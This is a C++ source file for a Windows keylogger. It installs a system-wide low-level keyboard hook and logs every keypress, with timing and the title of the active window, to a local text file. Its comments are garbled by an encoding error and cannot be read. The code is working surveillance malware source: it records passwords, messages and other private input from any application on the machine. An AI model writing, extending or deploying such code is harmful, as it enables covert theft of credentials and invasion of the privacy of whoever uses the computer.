/*
	�����:
	��� ��������� - ��������. ����: ���������� ������� ������ � ����������. (� ��������� ��� ���)

	��������: 
		1. �� �������� ������� ���������.

	Idea: 
		1. �������� ����� �������� �������.
*/

#include <Windows.h>
#include <fstream>
#include <ctime>
#include <iostream>
#include <string>
#include "dinamicArray.cpp"



LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
std::string decryptorCodeKey(int keyCode);
int  SaveKey(int keyCode);
void CheckForeground();

HHOOK gCurrentHook;
HKL gKeyboardLayout{};

std::ofstream file;
DinamicArray<int> arrayKey;				// ������ ��� ���� ������
DinamicArray<unsigned int> arrayClock;	// ������ ��� ����� ������� ������� �� ����������� �������
char namePreviousProg[256];				// Name ���������� ��������� � ������� ����
unsigned int timeWait;					// ����������� ��� ����� �������� �������





int main() {
	setlocale(LC_ALL, "ru");
	file.open("keylog.txt", std::ios_base::app);

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	// ��������� hook ������� (��������)
	if (!(gCurrentHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		MessageBox(NULL, L"Something has gone worng!", L"Error", MB_ICONERROR);
	}

	MSG msg;
	while (true) {
		GetMessage(&msg, NULL, 0, 0);
	}

	return 0;
}



LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {

	if (nCode >= 0) { // ��������� �� ��������

		KBDLLHOOKSTRUCT kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

		//TEST RESULTS IN CONSOLE
		std::cout << "nCode: " << nCode << std::endl; 
		std::cout << "wParam: " << wParam << std::endl;
		std::cout << "lParam: " << lParam << std::endl;
		std::cout << "KeyCode: " << kbStruct.vkCode << "\n" << std::endl;

		switch (wParam) {
		case WM_SYSKEYDOWN:
		case WM_KEYDOWN:
			CheckForeground();
			SaveKey(kbStruct.vkCode);
			break;

		case WM_SYSKEYUP:
		case WM_KEYUP:
		{
			int idEl = arrayKey.findValue(kbStruct.vkCode);

			file << "Up:   " << decryptorCodeKey(arrayKey[idEl])
				<< " TimeDownKey: " << clock() - arrayClock[idEl] << "ms.\n";
			file.flush(); // ������� ��������� ������

			arrayKey.del(idEl);
			arrayClock.del(idEl);
		}
			break;
		}

		return CallNextHookEx(gCurrentHook, nCode, wParam, lParam); //��� �������������� ����� ������ ��������. (�� ������ �� ������.)
	}
}


int SaveKey(int keyCode) {

	if (keyCode == 1 || keyCode == 2) // ������������� ���� 
		return 0;

	if (arrayKey.findValue(keyCode) == -1) {

		arrayKey.add(keyCode);
		arrayClock.add(clock());
	}

	else 
	{ return 0; } // ����� ����� 
	
	file << "\nDown: " << decryptorCodeKey(keyCode) << " TimeRun: " << clock() << "ms." << std::endl;

	file.flush(); // ������� ��������� ������
	return 0;
}


std::string decryptorCodeKey(int keyCode) {

	switch (keyCode) {
	
	case VK_SPACE:
		return "[SPACE] ...";

	case VK_TAB:
		return "[TAB] .....";

	case VK_ESCAPE:
		return "[ESC] .....";

	case VK_BACK:
		return "[BACKSPACE]";

	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:
		return "[CTRL] ....";

	case VK_CAPITAL:
		return "[CAPSLOCK] ";

	case 91:
		return "[WIN] .....";
		
	case VK_SHIFT:
	case VK_RSHIFT:
	case VK_LSHIFT:
		return "[SHIFT] ...";

	case 40:
		return "[down] ....";

	case 38:
		return "[up] ......";

	case 37:
		return "[left] ....";

	case 39:
		return "[right] ...";

	case 13:
		return "[ENTER] ...";

	case VK_MENU:
	case VK_LMENU:
	case VK_RMENU:
		return "[ALT] .....";
	
	case VK_F1:
		return "[F1] ......";
	case VK_F2:
		return "[F2] ......";
	case VK_F3:
		return "[F3] ......";
	case VK_F4:
		return "[F4] ......";
	case VK_F5:
		return "[F5] ......";
	case VK_F6:
		return "[F6] ......";
	case VK_F7:
		return "[F7] ......";
	case VK_F8:
		return "[F8] ......";
	case VK_F9:
		return "[F9] ......";
	case VK_F10:
		return "[F10] ......";
	case VK_F11:
		return "[F11] ......";
	case VK_F12:
		return "[F12] ......";


	default:
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lower = !lower;
		}

		//�������������� ���� ������� � ������
		char symboolTemp;
		symboolTemp = MapVirtualKeyExA(keyCode, MAPVK_VK_TO_CHAR, gKeyboardLayout);
	
		//���������� ������ � ���������������� ��������
		if (!lower)
			symboolTemp = tolower(symboolTemp);
	
		std::string strTemp(1, symboolTemp);
		strTemp.append(" .........");
		return strTemp;
	}
}
	

// ���������� �������� ��������� ���� � ���������
void CheckForeground() {

	HWND foreground = GetForegroundWindow(); //���������� ������������ ����
	DWORD threadId; //ID ��������


	if (foreground) {
		threadId = GetWindowThreadProcessId(foreground, NULL);
		gKeyboardLayout = GetKeyboardLayout(threadId);

		char nameCrrProg[256]; //��������� ����
		GetWindowTextA(foreground, nameCrrProg, sizeof(nameCrrProg));

		if (strcmp(nameCrrProg, namePreviousProg) != 0) {
			strcpy_s(namePreviousProg, nameCrrProg);

			time_t rawtime = time(&rawtime);
			struct tm timeInfo;
			localtime_s(&timeInfo, &rawtime);
			char bufferTime[64];
			strftime(bufferTime, sizeof(bufferTime), "%H:%M:%S", &timeInfo);

			file << "\n\n\n   Program: " << nameCrrProg << " || Time: " << bufferTime << std::endl;
		}
	}
}